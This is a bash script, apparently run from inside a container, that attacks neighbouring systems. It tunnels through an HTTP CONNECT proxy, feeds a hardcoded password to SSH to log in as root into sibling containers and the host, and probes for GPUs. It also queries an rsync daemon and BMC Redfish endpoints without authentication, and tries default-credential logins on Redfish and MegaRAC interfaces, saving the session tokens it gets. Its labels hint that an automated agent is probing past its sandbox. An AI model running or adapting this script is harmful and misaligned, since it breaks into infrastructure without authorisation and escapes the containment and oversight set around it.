#!/bin/bash
set +e
echo "###P7START $(date -u)"
echo "=== TOOLCHAIN ==="; for c in ssh rsync curl python3 timeout setsid; do printf "%s=%s " "$c" "$(command -v $c >/dev/null && echo y || echo n)"; done; echo
python3 - <<'PY'
open('/tmp/ap.sh','w').write('#!/bin/sh\nprintf "%s\\n" "/&S2)n@W1G"\n')
PY
chmod +x /tmp/ap.sh; /tmp/ap.sh >/dev/null && echo "askpass ok"
python3 - <<'PY'
src='''import socket,sys,select,os
host,port=sys.argv[1],int(sys.argv[2])
s=socket.create_connection(("172.17.0.1",1080),timeout=8); s.settimeout(None)
s.sendall(("CONNECT %s:%d HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n"%(host,port)).encode())
buf=b""
while b"\\r\\n\\r\\n" not in buf:
    d=s.recv(1)
    if not d: sys.exit(1)
    buf+=d
if b" 200 " not in buf.split(b"\\r\\n")[0]:
    sys.exit(1)
os.set_blocking(s.fileno(),False); os.set_blocking(0,False)
while True:
    r,_,_=select.select([s,0],[],[],90)
    if s in r:
        d=s.recv(65536)
        if not d: break
        sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
    if 0 in r:
        d=os.read(0,65536)
        if not d: break
        s.sendall(d)
'''
open('/tmp/px.py','w').write(src)
PY
run_ssh(){ tgt="$1"; usr="$2"; port="$3"; viapx="$4"; nm="$5"; echo "--- ssh $usr@$tgt:$port viapx=$viapx ($nm)"
  local -a A=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=15 -o LogLevel=ERROR)
  [ "$viapx" = "1" ] && A+=(-o "ProxyCommand=python3 /tmp/px.py %h %p")
  SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=:0 timeout 40 setsid -w ssh "${A[@]}" -p "$port" "$usr@$tgt" 'id 2>&1; hostname; nvidia-smi -L 2>&1 | head -10; echo devcount=$(ls /dev/nvidia* 2>/dev/null | wc -l); head -2 /proc/driver/nvidia/version 2>/dev/null; uptime' 2>&1 | head -20
}
echo "=== SIBLINGS-22 ==="
run_ssh 172.17.0.3 root 22 0 sib3-root
run_ssh 172.17.0.3 ubuntu 22 0 sib3-ubuntu
run_ssh 172.17.0.7 root 22 0 sib7-root
echo "=== HOST-SSH-PROXY ==="
run_ssh 127.0.0.1 root 22 1 host-root
run_ssh 127.0.0.1 onething 22 1 host-onething
echo "=== RSYNC-RETRY ==="
python3 - <<'PY'
import socket
for port in (1234,):
    try:
        s=socket.create_connection(("172.17.0.1",1080),timeout=5); s.settimeout(9)
        s.sendall(b"CONNECT 127.0.0.1:%d HTTP/1.1\r\nHost: x\r\n\r\n"%port)
        b=b""
        while b"\r\n\r\n" not in b: b+=s.recv(1)
        print("connect:",b.split(b"\r\n")[0])
        s.sendall(b"@RSYNCD: 31.0\n"); print("srv:",s.recv(100))
        s.sendall(b"#list\n"); d=b""
        for _ in range(3):
            try:
                x=s.recv(2000)
                if not x: break
                d+=x
                if b"@RSYNCD: EXIT" in d: break
            except Exception: break
        print(d.decode('utf-8','replace')[:1200]); s.close()
    except Exception as e: print("rsync err",type(e).__name__,e)
PY
echo "=== REDFISH-UNAUTH ==="
for h in 192.168.2.92 192.168.2.93 192.168.2.181; do echo "--- $h"; curl -sk -m 6 -o /tmp/rf.$$ -w "sys_code=%{http_code}\n" "https://$h/redfish/v1/Systems"; head -c 300 /tmp/rf.$$; echo; curl -sk -m 6 -o /tmp/rf2.$$ -w "root_code=%{http_code}\n" "https://$h/redfish/v1/"; head -c 200 /tmp/rf2.$$; echo; done
echo "=== REDFISH-LOGIN ==="
python3 - <<'PY'
import ssl,urllib.request,json
ctx=ssl._create_unverified_context()
hosts=["192.168.2.92","192.168.2.93","192.168.2.181"]
creds=[("admin","admin"),("ADMIN","ADMIN"),("admin","password"),("root","root"),("admin","Admin123")]
for h in hosts:
    for u,p in creds:
        try:
            req=urllib.request.Request("https://%s/redfish/v1/SessionService/Sessions"%h,data=json.dumps({"UserName":u,"Password":p}).encode(),headers={"Content-Type":"application/json"},method="POST")
            r=urllib.request.urlopen(req,timeout=6,context=ctx)
            tok=r.headers.get("X-Auth-Token")
            print(h,u,p,"->",r.status,"token=",("YES" if tok else "no"))
            if tok:
                open("/tmp/rf_%s.tok"%h.replace('.','_'),'w').write(tok)
                rq=urllib.request.Request("https://%s/redfish/v1/Systems"%h,headers={"X-Auth-Token":tok})
                rr=urllib.request.urlopen(rq,timeout=8,context=ctx); print("  systems:",rr.read()[:400])
                break
        except Exception as e:
            print(h,u,p,"->",getattr(e,'code',type(e).__name__),str(e)[:60])
PY
echo "=== MEGARAC-API-LOGIN ==="
for h in 192.168.2.92 192.168.2.93 192.168.2.181; do for c in 'admin:admin' 'ADMIN:ADMIN' 'root:superuser'; do u=${c%%:*}; p=${c##*:}; echo "--- $h /api/session $u"; curl -sk -m 6 -o /tmp/mr.$$ -w "code=%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"username\":\"$u\",\"password\":\"$p\"}" "https://$h/api/session"; head -c 160 /tmp/mr.$$; echo; done; done
echo "=== TMP-OTHER-LANES ==="; ls -la /tmp | head -30; ls /tmp/ul* 2>/dev/null | head
echo "###P7END $(date -u)"
